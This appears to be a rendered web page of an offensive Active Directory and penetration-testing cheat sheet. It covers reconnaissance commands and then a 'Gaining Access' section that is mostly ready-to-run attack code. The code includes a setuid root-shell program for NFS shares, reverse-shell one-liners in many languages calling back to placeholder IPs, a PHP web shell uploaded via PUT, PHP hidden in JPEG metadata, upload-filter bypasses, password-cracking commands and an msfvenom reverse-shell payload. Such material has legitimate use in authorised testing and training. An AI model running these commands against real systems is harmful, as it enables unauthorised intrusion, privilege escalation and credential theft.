          <li class="md-nav__item">
  <a href="#creating-backdoor-user-wo-password" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Backdoor User w/o Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-another-root-user" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Another root User
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#generating-openssl-password" class="md-nav__link">
    <span class="md-ellipsis">
      Generating OpenSSL Password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistent-back-doors" class="md-nav__link">
    <span class="md-ellipsis">
      Persistent Back Doors
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#code-execution-application-whitelist-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Code Execution / Application Whitelist Bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Code Execution / Application Whitelist Bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ieframedll" class="md-nav__link">
    <span class="md-ellipsis">
      Ieframe.dll
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="active-directory-pentest">Active Directory Pentest</h1>
<h2 id="reconnaissance-enumeration">Reconnaissance / Enumeration</h2>
<h3 id="extracting-live-ips-from-nmap-scan">Extracting Live IPs from Nmap Scan</h3>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span><span class="m">10</span>.1.1.1<span class="w"> </span>--open<span class="w"> </span>-oG<span class="w"> </span>scan-results<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>scan-results<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;/open&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span>&gt;<span class="w"> </span>exposed-services-ips
</code></pre></div>
<h3 id="simple-port-knocking">Simple Port Knocking</h3>
<div class="highlight"><pre><span></span><code><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">7000</span><span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="m">9000</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>host_timeout<span class="w"> </span><span class="m">201</span><span class="w"> </span>max-retries<span class="w"> </span><span class="m">0</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="m">1</span>.1.1.1<span class="p">;</span><span class="w"> </span><span class="k">done</span>
</code></pre></div>
<h3 id="dns-lookups-zone-transfers-brute-force">DNS lookups, Zone Transfers &amp; Brute-Force</h3>
<div class="highlight"><pre><span></span><code>whois<span class="w"> </span>domain.com
dig<span class="w"> </span><span class="o">{</span>a<span class="p">|</span>txt<span class="p">|</span>ns<span class="p">|</span>mx<span class="o">}</span><span class="w"> </span>domain.com
dig<span class="w"> </span><span class="o">{</span>a<span class="p">|</span>txt<span class="p">|</span>ns<span class="p">|</span>mx<span class="o">}</span><span class="w"> </span>domain.com<span class="w"> </span>@ns1.domain.com
host<span class="w"> </span>-t<span class="w"> </span><span class="o">{</span>a<span class="p">|</span>txt<span class="p">|</span>ns<span class="p">|</span>mx<span class="o">}</span><span class="w"> </span>megacorpone.com
host<span class="w"> </span>-a<span class="w"> </span>megacorpone.com
host<span class="w"> </span>-l<span class="w"> </span>megacorpone.com<span class="w"> </span>ns1.megacorpone.com
dnsrecon<span class="w"> </span>-d<span class="w"> </span>megacorpone.com<span class="w"> </span>-t<span class="w"> </span>axfr<span class="w"> </span>@ns2.megacorpone.com
dnsenum<span class="w"> </span>domain.com
nslookup<span class="w"> </span>-&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span>any<span class="w"> </span>-&gt;<span class="w"> </span>ls<span class="w"> </span>-d<span class="w"> </span>domain.com
<span class="k">for</span><span class="w"> </span>sub<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>subdomains.txt<span class="k">)</span><span class="p">;</span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="nv">$sub</span>.domain.com<span class="p">|</span>grep<span class="w"> </span><span class="s2">&quot;has.address&quot;</span><span class="p">;</span><span class="k">done</span>
</code></pre></div>
<h3 id="banner-grabbing">Banner Grabbing</h3>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">80</span>
telnet<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">80</span>
curl<span class="w"> </span>-vX<span class="w"> </span><span class="nv">$TARGET</span>
</code></pre></div>
<h3 id="nfs-exported-shares">NFS Exported Shares</h3>
<p>List NFS exported shares:</p>
<div class="highlight"><pre><span></span><code>showmount<span class="w"> </span>-e<span class="w"> </span><span class="m">192</span>.168.110.102
</code></pre></div>
<p>...and check if <code>'rw,no_root_squash'</code> is present. If it is present, compile the below <code>sid-shell.c</code>:</p>
<p>{% code title="sid-shell.c" %}
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="n">main</span><span class="p">(</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="n">envp</span><span class="w"> </span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="n">envp</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
{% endcode %}</p>
<p>...upload it to the share and execute the below to launch <code>sid-shell</code> to spawn a root shell:</p>
<div class="highlight"><pre><span></span><code>chown<span class="w"> </span>root:root<span class="w"> </span>sid-shell<span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+s<span class="w"> </span>sid-shell<span class="p">;</span><span class="w"> </span>./sid-shell
</code></pre></div>
<h3 id="kerberos-enumeration">Kerberos Enumeration</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># users</span>
nmap<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="w"> </span>krb5-enum-users<span class="w"> </span>--script-args<span class="w"> </span>krb5-enum-users.realm<span class="o">=</span><span class="s1">&#39;test&#39;</span>
</code></pre></div>
<h3 id="http-brute-force-vulnerability-scanning">HTTP Brute-Force &amp; Vulnerability Scanning</h3>
<div class="highlight"><pre><span></span><code><span class="nv">target</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="p">;</span><span class="w"> </span>gobuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$target</span><span class="w"> </span>-r<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>php,txt<span class="w"> </span>-t<span class="w"> </span><span class="m">150</span><span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span><span class="nv">$target</span>-gobuster
<span class="nv">target</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="p">;</span><span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>http://<span class="nv">$target</span>:80<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span><span class="nv">$target</span>-nikto
<span class="nv">target</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="p">;</span><span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://<span class="nv">$target</span>:80<span class="w"> </span>--enumerate<span class="w"> </span>u,t,p<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span><span class="nv">$target</span>-wpscan-enum
</code></pre></div>
<h3 id="rpc-netbios-smb">RPC / NetBios / SMB</h3>
<div class="highlight"><pre><span></span><code>rpcinfo<span class="w"> </span>-p<span class="w"> </span><span class="nv">$TARGET</span>
nbtscan<span class="w"> </span><span class="nv">$TARGET</span>

<span class="c1">#list shares</span>
smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$TARGET</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span>

<span class="c1"># null session</span>
rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="nv">$TARGET</span>
smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$TARGET</span>
enum4linux<span class="w"> </span><span class="nv">$TARGET</span>
</code></pre></div>
<h3 id="snmp">SNMP</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Windows User Accounts</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25

<span class="c1"># Windows Running Programs</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2

<span class="c1"># Windows Hostname</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>.1.3.6.1.2.1.1.5

<span class="c1"># Windows Share Information</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.3.1.1

<span class="c1"># Windows Share Information</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.27

<span class="c1"># Windows TCP Ports</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET4</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.6.13.1.3

<span class="c1"># Software Name</span>
snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2

<span class="c1"># brute-force community strings</span>
onesixtyone<span class="w"> </span>-i<span class="w"> </span>snmp-ips.txt<span class="w"> </span>-c<span class="w"> </span>community.txt

snmp-check<span class="w"> </span><span class="nv">$TARGET</span>
</code></pre></div>
<h3 id="smtp">SMTP</h3>
<div class="highlight"><pre><span></span><code>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/names.txt<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-m<span class="w"> </span><span class="m">150</span>
</code></pre></div>
<h3 id="active-directory">Active Directory</h3>
<div class="highlight"><pre><span></span><code># current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group &quot;domain controllers&quot; /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:&quot;spotless&quot;

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name

# find DFS shares with ADSI
$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls &quot;\\dc01\pipe\spoolss&quot;
</code></pre></div>
<h3 id="listen-on-a-port-powershell">Listen on a port (Powershell)</h3>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">Start</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="m">443</span>
<span class="err">$</span><span class="n">listener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpListener</span><span class="p">]</span><span class="m">443</span><span class="p">;</span><span class="w"> </span><span class="err">$</span><span class="n">listener</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>

<span class="k">while</span><span class="p">(</span><span class="err">$</span><span class="k">true</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">listener</span><span class="p">.</span><span class="n">AcceptTcpClient</span><span class="p">();</span>
<span class="w">    </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="err">$</span><span class="n">client</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">RemoteEndPoint</span><span class="w"> </span><span class="s">&quot;connected!&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="err">$</span><span class="n">client</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
<span class="w">    </span><span class="n">start</span><span class="o">-</span><span class="n">sleep</span><span class="w"> </span><span class="o">-</span><span class="n">seconds</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="gaining-access">Gaining Access</h2>
<h3 id="reverse-shell-one-liners">Reverse Shell One-Liners</h3>
<h4 id="bash">Bash</h4>
<div class="highlight"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.0.1/8080<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div>
<h4 id="perl">Perl</h4>
<div class="highlight"><pre><span></span><code>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</code></pre></div>
<h4 id="url-encoded-perl-linux">URL-Encoded Perl: Linux</h4>
<div class="highlight"><pre><span></span><code>echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
</code></pre></div>
<h4 id="python">Python</h4>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</code></pre></div>
<h4 id="php">PHP</h4>
<div class="highlight"><pre><span></span><code>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</code></pre></div>
<h4 id="ruby">Ruby</h4>
<div class="highlight"><pre><span></span><code>ruby<span class="w"> </span>-rsocket<span class="w"> </span>-e<span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
</code></pre></div>
<h4 id="netcat-without-e-1">Netcat without -e #1</h4>
<div class="highlight"><pre><span></span><code>rm<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/f
</code></pre></div>
<h4 id="netcat-without-e-2">Netcat without -e #2</h4>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">444</span>
telnet<span class="w"> </span>localhost<span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span>localhost<span class="w"> </span><span class="m">444</span>
</code></pre></div>
<h4 id="java">Java</h4>
<div class="highlight"><pre><span></span><code><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Runtime.getRuntime<span class="o">()</span><span class="p">;</span><span class="w"> </span><span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>r.exec<span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span>,<span class="s2">&quot;-c&quot;</span>,<span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span>as<span class="w"> </span>String<span class="o">[])</span><span class="p">;</span><span class="w"> </span>p.waitFor<span class="o">()</span><span class="p">;</span>
</code></pre></div>
<h4 id="xterm">XTerm</h4>
<div class="highlight"><pre><span></span><code>xterm<span class="w"> </span>-display<span class="w"> </span><span class="m">10</span>.0.0.1:1
</code></pre></div>
<h3 id="jdwp-rce">JDWP RCE</h3>
<div class="highlight"><pre><span></span><code><span class="n">print</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InputStreamReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">())).</span><span class="na">readLine</span><span class="p">())</span>
</code></pre></div>
<h3 id="working-with-restricted-shells">Working with Restricted Shells</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># rare cases</span>
ssh<span class="w"> </span>bill@localhost<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/tmp
</code></pre></div>
<div class="highlight"><pre><span></span><code>nice<span class="w"> </span>/bin/bash
</code></pre></div>
<h3 id="interactive-tty-shells">Interactive TTY Shells</h3>
<div class="highlight"><pre><span></span><code>/usr/bin/expect<span class="w"> </span>sh
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err"></span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="err"></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="err"></span><span class="p">)</span><span class="err"></span>
<span class="c1"># execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk</span>
<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([&quot;/bin/su&quot;,&quot;-c&quot;,&quot;id&quot;,&quot;bynarr&quot;],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,&quot;fruity</span><span class="se">\n</span><span class="s1">&quot;);time.sleep(0.1);print os.read(master,1024);&#39;</span>
</code></pre></div>
<h3 id="uploadingposting-files-through-www-upload-forms">Uploading/POSTing Files Through WWW Upload Forms</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># POST file</span>
curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@/file/location/shell.php&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/upload.php<span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;cookie&quot;</span>

<span class="c1"># POST binary data to web form</span>
curl<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;field=&lt;shell.zip&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/upld.php<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;k=v&#39;</span><span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;k=v;&quot;</span><span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;submit=true&quot;</span><span class="w"> </span>-L<span class="w"> </span>-v
</code></pre></div>
<h3 id="puting-file-on-the-webhost-via-put-verb">PUTing File on the Webhost via PUT verb</h3>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#39;</span><span class="w"> </span>http://192.168.2.99/shell.php
</code></pre></div>
<h3 id="generating-payload-pattern-calculating-offset">Generating Payload Pattern &amp; Calculating Offset</h3>
<div class="highlight"><pre><span></span><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb<span class="w"> </span>-l<span class="w"> </span><span class="m">2000</span>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb<span class="w"> </span>-q<span class="w"> </span><span class="nv">$EIP_VALUE</span>
</code></pre></div>
<h3 id="bypassing-file-upload-restrictions">Bypassing File Upload Restrictions</h3>
<ul>
<li>file.php -&gt; file.jpg</li>
<li>file.php -&gt; file.php.jpg</li>
<li>file.asp -&gt; file.asp;.jpg</li>
<li>file.gif (contains php code, but starts with string GIF/GIF98)</li>
<li>00%</li>
<li>file.jpg with php backdoor in exif (see below)</li>
<li>.jpg -&gt; proxy intercept -&gt; rename to .php</li>
</ul>
<h3 id="injecting-php-into-jpeg">Injecting PHP into JPEG</h3>
<div class="highlight"><pre><span></span><code>exiv2<span class="w"> </span>-c<span class="s1">&#39;A &quot;&lt;?php system($_REQUEST[&#39;</span>cmd<span class="s1">&#39;]);?&gt;&quot;!&#39;</span><span class="w"> </span>backdoor.jpeg
exiftool<span class="w"> </span>-comment&lt;<span class="o">=</span>back.php<span class="w"> </span>back.png
</code></pre></div>
<h3 id="uploading-htaccess-to-interpret-blah-as-php">Uploading .htaccess to interpret .blah as .php</h3>
<div class="highlight"><pre><span></span><code>AddType application/x-httpd-php .blah
</code></pre></div>
<h3 id="cracking-passwords">Cracking Passwords</h3>
<h4 id="cracking-web-forms-with-hydra">Cracking Web Forms with Hydra</h4>
<div class="highlight"><pre><span></span><code>hydra<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>http-post-form<span class="w"> </span>-L<span class="w"> </span>/usr/share/wordlists/list<span class="w"> </span><span class="s2">&quot;/endpoint/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot;</span><span class="w"> </span>-s<span class="w"> </span>PORT<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/list
</code></pre></div>
<h4 id="cracking-common-protocols-with-hydra">Cracking Common Protocols with Hydra</h4>
<div class="highlight"><pre><span></span><code>hydra<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-l<span class="w"> </span>username<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/list<span class="w"> </span>ftp<span class="p">|</span>ssh<span class="p">|</span>smb://10.0.0.1
</code></pre></div>
<h4 id="hashcat-cracking">HashCat Cracking</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Bruteforce based on the pattern;</span>
hashcat<span class="w"> </span>-a3<span class="w"> </span>-m0<span class="w"> </span>mantas?d?d?d?u?u?u<span class="w"> </span>--force<span class="w"> </span>--potfile-disable<span class="w"> </span>--stdout<span class="w">  </span>

<span class="c1"># Generate password candidates: wordlist + pattern;</span>
hashcat<span class="w"> </span>-a6<span class="w"> </span>-m0<span class="w"> </span><span class="s2">&quot;e99a18c428cb38d5f260853678922e03&quot;</span><span class="w"> </span>yourPassword<span class="p">|</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>?d?d?d?u?u?u<span class="w"> </span>--force<span class="w"> </span>--potfile-disable<span class="w"> </span>--stdout

<span class="c1"># Generate NetNLTMv2 with internalMonologue and crack with hashcat</span>
InternalMonologue.exe<span class="w"> </span>-Downgrade<span class="w"> </span>False<span class="w"> </span>-Restore<span class="w"> </span>False<span class="w"> </span>-Impersonate<span class="w"> </span>True<span class="w"> </span>-Verbose<span class="w"> </span>False<span class="w"> </span>-challange<span class="w"> </span><span class="m">002233445566778888800</span>
<span class="c1"># resulting hash</span>
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

<span class="c1"># crack with hashcat</span>
hashcat<span class="w"> </span>-m5600<span class="w"> </span><span class="s1">&#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39;</span><span class="w"> </span>-a<span class="w"> </span><span class="m">3</span><span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force<span class="w"> </span>--potfile-disable
</code></pre></div>
<h3 id="generating-payload-with-msfvenom">Generating Payload with msfvenom</h3>
<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.11.0.245<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00\x0a\x0d&quot;</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai
</code></pre></div>
<h3 id="compiling-code-from-linux">Compiling Code From Linux</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Windows</span>
i686-w64-mingw32-gcc<span class="w"> </span>source.c<span class="w"> </span>-lws2_32<span class="w"> </span>-o<span class="w"> </span>out.exe

<span class="c1"># Linux</span>
gcc<span class="w"> </span>-m32<span class="p">|</span>-m64<span class="w"> </span>-o<span class="w"> </span>output<span class="w"> </span>source.c
</code></pre></div>
<h3 id="compiling-assembly-from-windows">Compiling Assembly from Windows</h3>
